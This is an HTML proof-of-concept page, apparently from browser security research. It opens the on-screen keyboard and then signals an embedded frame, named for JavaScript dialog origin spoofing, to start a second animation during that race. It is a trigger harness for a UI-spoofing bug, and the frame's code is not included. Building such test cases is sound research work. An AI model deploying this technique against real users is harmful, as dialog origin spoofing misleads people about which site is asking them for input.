<!doctype html>
<html>
<head>
<style>
input {
  width: 90%;
  font-size: 20px;
  padding: 10px;
}
#testFrame { width: 100%; height: 400px; border: 1px solid #aaa; }
</style>
</head>

<body>
  <h3>IME Animation Replacement Test PoC</h3>

  <!-- Focus element to force IME -->
  <input id="imeInput" placeholder="Tap here to open keyboard">

  <p><a href="#" id="trigger">Trigger Animation Race</a></p>

  <iframe id="testFrame" src="js-dialog-origin-spoof-frame.html"></iframe>

<script>
const ime = document.getElementById("imeInput");

// STEP 1: open IME immediately
ime.addEventListener("touchstart", () => {
    // force keyboard open via auto-focus
    setTimeout(() => ime.focus(), 20);
});

// STEP 2: trigger animation replacement
document.getElementById("trigger").onclick = () => {
    // FRAME: send command to trigger second animation WHILE IME is open
    testFrame.contentWindow.postMessage("run-second-animation", "*");
};
</script>

</body>
</html>
